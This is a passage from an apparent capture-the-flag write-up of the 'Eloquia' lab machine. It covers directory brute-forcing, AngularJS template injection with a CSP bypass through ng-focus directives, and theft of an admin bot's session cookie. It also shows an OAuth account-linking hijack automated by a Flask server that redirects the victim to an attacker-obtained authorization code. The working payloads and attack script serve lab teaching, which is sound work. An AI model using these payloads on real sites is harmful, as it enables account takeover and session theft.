503      GET        1l        2w       19c http://eloquia.htb/about-us
503      GET        1l        2w       19c http://eloquia.htb/contact/Css
503      GET        1l        2w       19c http://eloquia.htb/about/404
503      GET        1l        2w       19c http://eloquia.htb/contact/my-wishlist
503      GET        1l        2w       19c http://eloquia.htb/contact/process
503      GET        1l        2w       19c http://eloquia.htb/about/Images
503      GET        1l        2w       19c http://eloquia.htb/about/new
503      GET        1l        2w       19c http://eloquia.htb/about/templets
503      GET        1l        2w       19c http://eloquia.htb/contact/master
503      GET        1l        2w       19c http://eloquia.htb/about/2011
503      GET        1l        2w       19c http://eloquia.htb/about/poll
503      GET        1l        2w       19c http://eloquia.htb/about/old
503      GET        1l        2w       19c http://eloquia.htb/contact/flv
503      GET        1l        2w       19c http://eloquia.htb/about/blocks
503      GET        1l        2w       19c http://eloquia.htb/contact/extern
503      GET        1l        2w       19c http://eloquia.htb/about/library
503      GET        1l        2w       19c http://eloquia.htb/OLD
503      GET        1l        2w       19c http://eloquia.htb/contact/my-account
503      GET        1l        2w       19c http://eloquia.htb/about/contacts
503      GET        1l        2w       19c http://eloquia.htb/about/a
503      GET        1l        2w       19c http://eloquia.htb/about/Library
503      GET        1l        2w       19c http://eloquia.htb/usr
503      GET        1l        2w       19c http://eloquia.htb/contact/contactus
503      GET        1l        2w       19c http://eloquia.htb/about/class
404      GET        0l        0w        0c http://eloquia.htb/about/Bin
503      GET        1l        2w       19c http://eloquia.htb/about/bbs
503      GET        1l        2w       19c http://eloquia.htb/contact/agent
503      GET        1l        2w       19c http://eloquia.htb/about/personal
503      GET        1l        2w       19c http://eloquia.htb/contact/FileUpload
503      GET        1l        2w       19c http://eloquia.htb/configs
503      GET        1l        2w       19c http://eloquia.htb/about/events
503      GET        1l        2w       19c http://eloquia.htb/gb
503      GET        1l        2w       19c http://eloquia.htb/multimedia
503      GET        1l        2w       19c http://eloquia.htb/contact/frm_attach
503      GET        1l        2w       19c http://eloquia.htb/about/internal
503      GET        1l        2w       19c http://eloquia.htb/about/order
503      GET        1l        2w       19c http://eloquia.htb/game
503      GET        1l        2w       19c http://eloquia.htb/about/usage
503      GET        1l        2w       19c http://eloquia.htb/about/nl
503      GET        1l        2w       19c http://eloquia.htb/about/feeds
503      GET        1l        2w       19c http://eloquia.htb/contact/annuaire
503      GET        1l        2w       19c http://eloquia.htb/down
503      GET        1l        2w       19c http://eloquia.htb/bmz_cache
503      GET        1l        2w       19c http://eloquia.htb/listings
503      GET        1l        2w       19c http://eloquia.htb/about/e
503      GET        1l        2w       19c http://eloquia.htb/contact/incl
503      GET        1l        2w       19c http://eloquia.htb/about/wp-trackback
503      GET        1l        2w       19c http://eloquia.htb/contact/hosting
503      GET        1l        2w       19c http://eloquia.htb/about/list
503      GET        1l        2w       19c http://eloquia.htb/API
503      GET        1l        2w       19c http://eloquia.htb/temaoversikt
503      GET        1l        2w       19c http://eloquia.htb/about/backoffice
503      GET        1l        2w       19c http://eloquia.htb/contact/posts
503      GET        1l        2w       19c http://eloquia.htb/contact/program
503      GET        1l        2w       19c http://eloquia.htb/webcharts
503      GET        1l        2w       19c http://eloquia.htb/about/popups
503      GET        1l        2w       19c http://eloquia.htb/FUNCTION
503      GET        1l        2w       19c http://eloquia.htb/formmail
503      GET        1l        2w       19c http://eloquia.htb/is-bin
503      GET        1l        2w       19c http://eloquia.htb/contact/PrivateAssets
503      GET        1l        2w       19c http://eloquia.htb/contact/spec
503      GET        1l        2w       19c http://eloquia.htb/contact/webtrends
503      GET        1l        2w       19c http://eloquia.htb/about/multimedia
503      GET        1l        2w       19c http://eloquia.htb/about/bb
503      GET        1l        2w       19c http://eloquia.htb/about/pntables
503      GET        1l        2w       19c http://eloquia.htb/contact/sec
503      GET        1l        2w       19c http://eloquia.htb/about/tp
503      GET        1l        2w       19c http://eloquia.htb/ubb
503      GET        1l        2w       19c http://eloquia.htb/teste
503      GET        1l        2w       19c http://eloquia.htb/about/messaging
503      GET        1l        2w       19c http://eloquia.htb/about/periodic
503      GET        1l        2w       19c http://eloquia.htb/contact/playlists
503      GET        1l        2w       19c http://eloquia.htb/contact/prestashop
503      GET        1l        2w       19c http://eloquia.htb/about/structure
503      GET        1l        2w       19c http://eloquia.htb/contact/proposals
404      GET        0l        0w        0c http://eloquia.htb/contact/BIN
404      GET        0l        0w        0c http://eloquia.htb/BIN
503      GET        1l        2w       19c http://eloquia.htb/about/classroom
503      GET        1l        2w       19c http://eloquia.htb/c_action
404      GET        0l        0w        0c http://eloquia.htb/about/BIN
400      GET        6l       26w      324c http://eloquia.htb/contact/error%1F_log
400      GET        6l       26w      324c http://eloquia.htb/about/error%1F_log
400      GET        6l       26w      324c http://eloquia.htb/error%1F_log
503      GET        1l        2w       19c http://eloquia.htb/forms_management
[####################] - 13m    90000/90000   0s      found:365     errors:48
[####################] - 13m    30000/30000   39/s    http://eloquia.htb/
[####################] - 13m    30000/30000   39/s    http://eloquia.htb/contact/
[####################] - 13m    30000/30000   39/s    http://eloquia.htb/about/
```

Nothing too interesting, though the large chunk of 502/503 responses suggests the server gets overloaded and that the scan may not be reliable.

With some extra brute-forcing and knowledge about Django I can find the admin login page at `/accounts/admin`:

![image-20261012082657488](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0fdd38654497198e.png)

![image-20261012082657488](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012082657488.webp)

This is very clearly a Django login page. The Django admin panel is typically at `/admin` or `/<project>/admin`. Since `/<project>` typically returns 404 (as `/accounts` does here), finding it requires fuzzing something like `/FUZZ/admin` with common wordlists. It’s not necessary in Eloquia to find the page this way.

### qooqle.htb - TCP 80

#### Site

This is very clearly a Google clone:

![image-20261012082759599](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a334ecdb373558a4.png)

![image-20261012082759599](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012082759599.webp)

Most of the functionality doesn’t work, but the login page does:

![image-20261012083013461](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c4b8c60ff4e352b6.png)

![image-20261012083013461](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012083013461.webp)

I’ll create an account:

![image-20261012083236261](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/aa9420f9c997e305.png)

![image-20261012083236261](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012083236261.webp)

Logging in just offers a profile edit:

![image-20261012083307832](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0565273a49de2c66.png)

![image-20261012083307832](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012083307832.webp)

#### Tech Stack

The HTTP response headers show the same ARR as above (though interestingly don’t show IIS):

```yaml
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Vary: Cookie
Cross-Origin-Opener-Policy: same-origin
Referrer-Policy: same-origin
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-Powered-By: ARR/3.0
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Date: Mon, 12 Oct 2026 12:27:10 GMT
Content-Length: 7318
```

The 404 page is the default [Django 404](https://0xdf.gitlab.io/cheatsheets/404#django):

![image-20261012083531576](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012083531576.webp)

### OAuth

#### Login Without Linking

I’ll logout of `eloquia.htb` and then try to login with Qooqle. When I click the button, there is a redirect:

![image-20261012084325906](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1aa75e53917a2594.png)

![image-20261012084325906](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012084325906.webp)

The Eloquia endpoint redirects to Qooqle with the information needed to send back to Eloquia. This page on `qooqle.htb` is asking if I will authorize providing Eloquia access to my account:

![image-20261012083916076](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f62158ac1cc3ce8b.png)

![image-20261012083916076](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012083916076.webp)

When I click “Authorize”, it redirects to a page on `eloquia.htb`:

![image-20261012084452741](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/19188f8843d6ef26.png)

![image-20261012084452741](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012084452741.webp)

Which shows a failure message:

![image-20261012083930304](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/211cbdacb4cefce6.png)

![image-20261012083930304](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012083930304.webp)

I told Qooqle that it can share information with Eloquia, but Eloquia doesn’t find an account that has this Qooqle account linked with it (even though they share the same email address).

#### Login With Linking

I’ll login to Eloquia with username and password, and go to “Connected Accounts”. When I click “Change” next to Qooqle, I end up at the same “Authorize Eloquia” page on `qooqle.htb`:

![image-20261012084627472](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c12c79abd77aa5eb.png)

![image-20261012084627472](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012084627472.webp)

This time when I click “Authorize” the browser ends up back at my profile and it shows active:

![image-20261012084654483](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/51d10ba9abc62581.png)

![image-20261012084654483](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012084654483.webp)

That HTTP exchange looks like:

![image-20261012084741075](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f44147edcb35cdac.png)

![image-20261012084741075](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012084741075.webp)

The first request returns a redirect to `qooqle.htb` with the information it needs back. The second loads the form for me to click Authorize. That generates the third request (the POST), which tells Qooqle to authorize, which returns a 302 using the `redirect_uri` parameter from the first request. The fourth request is back to that URI with the authorization code, completing the authentication. On that callback, Eloquia sends the code directly to Qooqle (server to server) in exchange for an access token, uses that token to fetch the Qooqle account details, and links that Qooqle account to whatever Eloquia session made the callback request. Then the Eloquia application redirects back to the user-facing profile page.

Now I can logout, and the login with Qooqle button works!

## Shell as web

### Injection Tests

#### HTML Injection

I’ll look at what kinds of filtering happen when I make a POST. For example:

![image-20261012074810387](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7052a7b4dce4e408.png)

![image-20261012074810387](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012074810387.webp)

The title seems to escape HTML just fine. The body allows the bold tag and the link (which isn’t surprising given they are features in the editor), but strips the `<script>` tags:

![image-20261012075950130](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a7babb376856ef2e.png)

![image-20261012075950130](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012075950130.webp)

I’ll try another one with `<img src=x onerror=alert(1)>` in the body:

![image-20261012170145573](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/fe0985208ccf8cbf.png)

![image-20261012170145573](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012170145573.webp)

It strips that out as well:

![image-20261012170212090](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/724089d527f452a8.png)

![image-20261012170212090](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012170212090.webp)

The raw HTML looks like:

```html
<div id="article-content">
    <p>Testing with an img tag here: .</p>
</div>
```

#### AngularJS Template Injection

I’ll try to check for AngularJS template injection by sending a body with `{{ 7 * 7 }}`:

![image-20261012170631156](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/521f1d276dd2f2bd.png)

![image-20261012170631156](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012170631156.webp)

The resulting page shows 49:

![image-20261015101040028](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8bde950ecca2bd2a.png)

![image-20261015101040028](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261015101040028.webp)

The server-side sanitizing doesn’t touch curly braces, and since the article is rendered inside the AngularJS app, AngularJS evaluates any `{{ }}` expression it finds in the page.

I’ll switch to Repeater to try a classic AngularJS payload that reaches JavaScript’s `Function` constructor to run arbitrary code, `{{constructor.constructor('alert(1)')()}}`:

![image-20261012170741975](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/cfae1e92b266f6cf.png)

![image-20261012170741975](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012170741975.webp)

This doesn’t work:

![image-20261012170936623](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/99a6975c928ccf06.png)

![image-20261012170936623](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012170936623.webp)

The dev tools console shows why:

![image-20261012171005089](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/12e06f8a3201c5ff.png)

![image-20261012171005089](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012171005089.webp)

The CSP header says:

```rust
Content-Security-Policy: style-src 'self' 'unsafe-inline' fonts.googleapis.com; default-src 'self'; font-src 'self' fonts.googleapis.com fonts.gstatic.com; script-src 'self'; object-src 'none'
```

The important part is `script-src 'self'`. Without `unsafe-eval`, I can’t create a new function, which is what `constructor.constructor` is trying to do.

#### AngularJS CSP Bypass via ng Directives

AngularJS has the concept of [Directives](https://docs.angularjs.org/guide/directive):

> At a high level, directives are markers on a DOM element (such as an attribute, element name, comment or CSS class) that tell AngularJS’s **HTML compiler** ([`$compile`](https://docs.angularjs.org/api/ng/service/$compile)) to attach a specified behavior to that DOM element (e.g. via event listeners), or even to transform the DOM element and its children.

There are a ton of these, all listed in the [AngularJS directive docs](https://docs.angularjs.org/api/ng/directive). I’ll see if I can use these to bypass the CSP rules and get arbitrary JavaScript execution. I’ll start with `ng-click` as a POC I can manually trigger, and then move to something like `ng-focus` once I have something working.

I’ll send `<span ng-click="$event.view.alert(1)">click me</span>`:

![image-20261012171857531](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/073391735ba7df36.png)

![image-20261012171857531](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012171857531.webp)

The resulting page has the “click me” text:

![image-20261012171918263](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/59978e6d3d5e1f2c.png)

![image-20261012171918263](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012171918263.webp)

And the HTML has the span unmodified:

```html
<div id="article-content">
     <p>Test: <span ng-click="$event.view.alert(1)">click me</span>.</p></div>
```

Clicking it pops an alert!

![image-20261012172007101](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a46aba3701404e81.png)

![image-20261012172007101](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012172007101.webp)

This works because AngularJS evaluates directive expressions with its own parser rather than JavaScript’s `eval`, so the CSP doesn’t block them. `$event` is the DOM event object that AngularJS passes into the expression, and `$event.view` is the `window` the event happened in, which gives access to anything on `window`, like `alert`, `document.cookie`, or `document.location`.

I’ll change it to `ng-focus`, and submit again. This time it’s a bit fidgety to trigger, but it does after I scroll around on the page a bit, without clicking. I’ll find that adding `tabindex="-1"` and `autofocus` to the span makes this much more reliable.

### Site Access as admin

#### Overview

I’ll show two ways to do this. The first is just stealing the admin user’s cookie, which realistically shouldn’t work because Django sets `httponly`, but does because of a poorly coded bot (which I’ll show in [Beyond Root](#bot-cookie-mistake)). I’ll also show the intended way to abuse OAuth to get access as the administrator account.

```
intendedunintendedUnprivileged Site AccessCookie TheftPrivileged Site AccessOAuth Hijack
```

#### via Cookie Theft

To complete this attack, I’m going to submit the comment as the bot user with their cookie as the body. That bypasses the CSP and doesn’t need to connect back to my host, and can be done completely using AngularJS functions on the page.

One of the JavaScript files loaded by the page is `article-comment.js`:

```javascript
angular.module('article-details', [])
    .controller('myController', function ($scope, $http, $sce) {
        $scope.formData = {};
        $scope.submitted = false; // Flag to track form submission

        // submit article comment
        $scope.submitForm = function () {
            $scope.submitted = true; // Set the flag to true

            // get article Id
            articleId = window.location.href.split('/')[5];
            $scope.formData.csrfmiddlewaretoken = document.getElementById("csrfmiddlewaretoken").value;
            var config = {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            };

            $http.post('/article/comment/add/' + articleId + '/', $.param($scope.formData), config)
                .then(function (response) {
                    // Clear the form data
                    $scope.formData = {};

                    // Get the updated comments
                    $scope.getComments();
                })
                .catch(function (error) {
                    console.log('Error:', error);
                })
                .finally(function () {
                    $scope.submitted = false; // Reset the flag
                });
        };

        // get article comments
        $scope.getComments = function () {
            // get article Id
            articleId = window.location.href.split('/')[5];
            $http.get('/article/comment/get/' + articleId + '/')
                .then(function (response) {
                    $scope.article_comments = $sce.trustAsHtml(response.data);
                })
                .catch(function (error) {
                    console.log('Error:', error);
                });
        };

        $scope.reportArticle = function () {
            articleId = window.location.href.split('/')[5];
            window.location.href = "/article/report/"+articleId+"/";
        };

        // Automatically execute getComments() when the controller is loaded
        $scope.$watch('$viewContentLoaded', function () {
            $scope.getComments();
        });
    });
```

I’ll note the `submitForm` function that handles the CSRF token, getting the right article, comments, and submitting them.

The HTML for the form looks like:

```html
<form name="commentForm" ng-submit="submitForm()" novalidate="" class="ng-pristine ng-invalid ng-invalid-required">
    <input type="hidden" id="csrfmiddlewaretoken" value="MHAWvX16W96iIrq6bw9PBNWZboOq2vdLxrZQ4peYjT4flTPHyysDRWFW5SIhkgU6" autocomplete="off">
    <div class="col-lg-12 col-md-12">
        <div class="form-group">
            <textarea name="comment" class="form-control ng-pristine ng-empty ng-invalid ng-invalid-required ng-touched" placeholder="Your Comments" required="" ng-model="formData.comment"></textarea>
        </div>
    </div>
    <div class="col-lg-12 col-md-12">
        <button type="submit" class="default-btn" ng-disabled="submitted">Post A Comment <i class="flaticon-send"></i></button>
    </div>
</form>
```

Within AngularJS, I can reference the comment in the form as `formData.comment`. So this payload will update the comment to be the user’s cookie and submit it:

```html
<span ng-focus="formData.comment=$event.view.document.cookie;submitForm()" autofocus tabindex="-1">click me</span>
```

When I send this, after moving around a bit, it posts my `csrftoken` (as expected because of `httponly` on the `sessionid`):

![image-20261012174333894](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8de78a29d0f9296f.png)

![image-20261012174333894](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012174333894.webp)

After I report the article and wait a minute or so, there’s a new comment (along with another I triggered):

![image-20261012174507953](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4637ab106bce05a9.png)

![image-20261012174507953](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012174507953.webp)

This includes the admin user’s `sessionid` cookie! When I update the cookie in my browser and go to my profile, I’m logged in as admin:

![image-20261012174608648](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b22d33f542896763.png)

![image-20261012174608648](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012174608648.webp)

I’ll show the bot script and why this worked in [Beyond Root](#bot-cookie-mistake).

#### via Manual OAuth Hijack \[Fail\]

When Eloquia starts the OAuth flow, it redirects to a `qooqle.htb` URL that doesn’t include a `state` parameter (I’ll show the code for this in [Beyond Root](#missing-state)). `state` is meant to bind the OAuth callback to the browser session that started the flow. Without it, Eloquia will accept a callback code in any user’s session, and link that user’s account to whichever Qooqle account the code belongs to. If I can get the admin to visit a callback URL with a code for my Qooqle account, their Eloquia account will be linked to my Qooqle account.

I’ll start by creating a fresh Qooqle account:

![image-20261012182156428](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4dca6a20b3f4e669.png)

![image-20261012182156428](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012182156428.webp)

And a fresh Eloquia account named tester (in another browser).

On my “Connected Accounts” page from my attacker account, I’ll click “Change”, which loads a Qooqle page:

![image-20261012182832536](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/142233b642d4e45e.png)

![image-20261012182832536](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012182832536.webp)

Here I’ll turn on Burp Proxy Intercept so that I can control what requests are sent, and click “Authorize”. The first request is a POST request to `qooqle.htb`:

```bash
POST /oauth2/authorize/?client_id=riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi&response_type=code&redirect_uri=http://eloquia.htb/accounts/oauth2/qooqle/callback/ HTTP/1.1
Host: qooqle.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://qooqle.htb/oauth2/authorize/?client_id=riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi&response_type=code&redirect_uri=http://eloquia.htb/accounts/oauth2/qooqle/callback/
Content-Type: application/x-www-form-urlencoded
Content-Length: 329
Origin: http://qooqle.htb
Connection: keep-alive
Cookie: csrftoken=1PdmFrspR3KTGJOw11KTAyCn0J2UJ7O1; sessionid=1w7fjukc20on8ru91qjtqdp7v0pnbk55
Upgrade-Insecure-Requests: 1
Priority: u=0, i

csrfmiddlewaretoken=X7r2NGBRpnpcg4SBAI352QcC2yLUFEO5OMueiXT66gZVMDwXrzDOseEPS7DEeBsW&redirect_uri=http%3A%2F%2Feloquia.htb%2Faccounts%2Foauth2%2Fqooqle%2Fcallback%2F&scope=read+write&nonce=&client_id=riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi&state=&response_type=code&code_challenge=&code_challenge_method=&claims=&allow=Authorize
```

I’ll let this through. It returns a 302 redirect, which generates another request:

```yaml
GET /accounts/oauth2/qooqle/callback/?code=au2ITBkqnk7cUM4uRBAPFgXPHicO3V HTTP/1.1
Host: eloquia.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: csrftoken=3Viv8QYPKsF4Sw1Iy5qX4ibt2k4Gh4g0; sessionid=e4228ihp0zhs8mqqod1i1hocggr73ctk
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

I’ll grab this URL and drop this request. Authorization codes are single-use, so if my browser made this request, it would use up the code linking my own account. I’ll paste the URL into the other browser where the target account is logged in, and it links:

![image-20261012183245720](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6f76118e1eaefbe8.png)

![image-20261012183245720](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261012183245720.webp)

I can log out and back in with the hijacker Qooqle account and get in as tester.

I will need to move quickly during this attack. The OAuth spec ([RFC 6749](https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.2)) recommends that authorization codes live no more than 10 minutes, though the default of DOT (a common Django provider package) is 60 seconds, and this seems to expire even faster than that. If I take too long, instead of linking the accounts I’ll get:

```
Failed to retrieve access token. Error: {"error": "invalid_grant"}
```

I’ll start in a tab on my attacker account with a POST draft using the following payload:

```html
<span ng-focus="$event.view.document.location=''" autofocus tabindex="-1">click me</span>
```

I’ll fill in the location when I get it. Then I’ll step through the steps above, but instead of pasting the URL into my target user browser, I’ll update the post to include it:

```html
<span ng-focus="$event.view.document.location='/accounts/oauth2/qooqle/callback/?code=Y5oYFa1ZA473vKXQvU9FLbQxflrWqe'" autofocus tabindex="-1">click me</span>
```

Now I’ll quickly submit the post and report it, but I’m never able to get it done fast enough. I’ll show why in [Beyond Root](#code-expiration-time).

#### via Automated OAuth Hijack

To pull off this attack, I’ll change the flow to remove the time pressure:

-   Use the AngularJS injection to send the admin’s browser to my server.
-   On receiving the request, have my server start the OAuth authorization step with my Qooqle account, and then immediately upon getting it, return a redirect to the victim’s browser to the authorization callback link.

Rather than starting the timer and then trying to get the user to look, I’ll wait until I have the user’s browser engaged, and then start the flow (and the timer) and immediately get them to redirect to it.

To make sure I can do this redirect, I’ll create a post with a redirect back to my host. The payload is:

```html
<span ng-focus="$event.view.document.location='http://10.10.15.169/visit'" autofocus tabindex="-1">click me</span>
```

On reporting this post, there’s a hit at my Python web server shortly after:

```css
10.129.244.81 - - [12/Oct/2026 18:26:48] code 404, message File not found
10.129.244.81 - - [12/Oct/2026 18:26:48] "GET /visit HTTP/1.1" 404 -
10.129.244.81 - - [12/Oct/2026 18:26:48] code 404, message File not found
10.129.244.81 - - [12/Oct/2026 18:26:48] "GET /favicon.ico HTTP/1.1" 404 -
```

That it’s trying to get a `favicon.ico` suggests this is a real (likely headless) browser and not just a script making HTTP requests.

I’ll write a Flask server that handles the flow from here:

```python
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "flask",
#     "requests",
# ]
# ///
import re
import sys
import requests
from flask import Flask, redirect


app = Flask(__name__)

eloquia_user = "0xdf"
eloquia_pass = "0xdf0xdf"
qooqle_user = "0xdf"
qooqle_pass = "0xdf0xdf"

sess = requests.session()

# login to Eloquia
resp = sess.get('http://eloquia.htb/accounts/login/')
csrf = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', resp.text).group(1)
resp = sess.post('http://eloquia.htb/accounts/login/',
                 data={"csrfmiddlewaretoken": csrf, "username": eloquia_user, "password": eloquia_pass})
if 'sessionid' not in sess.cookies:
    sys.exit(f"[-] Eloquia login failed: {resp.status_code}")
print(f"[+] Logged into Eloquia as {eloquia_user}")

# login to Qooqle
resp = sess.get('http://qooqle.htb/login/')
csrf = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', resp.text).group(1)
resp = sess.post('http://qooqle.htb/login/',
                 data={"csrfmiddlewaretoken": csrf, "username": qooqle_user, "password": qooqle_pass})
if 'sessionid' not in sess.cookies:
    sys.exit(f"[-] Qooqle login failed: {resp.status_code}")
print(f"[+] Logged into Qooqle as {qooqle_user}")


# serve attack
@app.route('/start')
def start():
    resp = sess.get('http://eloquia.htb/accounts/oauth2/qooqle/authorize/')
    data = dict(re.findall(r'<input type="hidden" name="([^"]+)"(?: value="([^"]*)")?', resp.text))
    data["allow"] = "Authorize"
    resp = sess.post(resp.url, data=data, headers={"Referer": resp.url}, allow_redirects=False)
    callback = resp.headers.get("Location", "")
    if "code=" not in callback:
        return f"[-] No code from Qooqle: {resp.status_code} {callback}", 500
    print(f"[+] Redirecting victim to {callback}")
    return redirect(callback)


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```

At the start, it logs in to both Eloquia and Qooqle within a session. Then it defines a single route, `/start`, which starts the auth flow to link accounts before sending that last redirect back to the user. I’ll update the post payload to point at `/start`:

```html
<span ng-focus="$event.view.document.location='http://10.10.15.169/start'" autofocus tabindex="-1">click me</span>
```

When I report the post, it works:

```swift
oxdf@hacky$ uv run oauth-serve.py 
[+] Logged into Eloquia as 0xdf
[+] Logged into Qooqle as 0xdf
 * Serving Flask app 'oauth-serve'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.1.251:80
Press CTRL+C to quit
[+] Redirecting victim to http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=6hTNgkBUPO18HyVlTvM8h2Uy4bmbLi
10.129.244.81 - - [11/Oct/2026 19:18:34] "GET /start HTTP/1.1" 302 -
```

Then I’ll log out of Eloquia and back in using Qooqle, and I’m logged in as admin, whose account is now linked to my Qooqle account (0xdf@gmail.htb):

![image-20261013094509458](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/97f23feb90dcc187.png)

![image-20261013094509458](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013094509458.webp)

### Django Admin Panel

#### Admin Panel Enumeration

Regardless of how I get access, as admin there’s a new item in the Eloquia profile left menu bar:

![image-20261013103737498](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/26ab5268fbf586d5.png)

![image-20261013103737498](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013103737498.webp)

Clicking that leads to the Django admin panel at `/accounts/admin/` (mentioned [above](#directory-brute-force)):

![image-20261013104233470](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/021cae219bc02011.png)

![image-20261013104233470](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013104233470.webp)

This is a wrapper around the database used by Django. I can click into items and edit them here:

![image-20261015081242057](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/62cf8a17cd5d7696.png)

![image-20261015081242057](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261015081242057.webp)

I’ll use the upload functionality of this later.

There is a “SQL Explorer” link at the bottom right, which leads to `/dev/sql-explorer/`:

![image-20261013104616146](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ccc232536b0ed3ac.png)

![image-20261013104616146](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013104616146.webp)

#### Database Enumeration

The Playground gives a place to run queries:

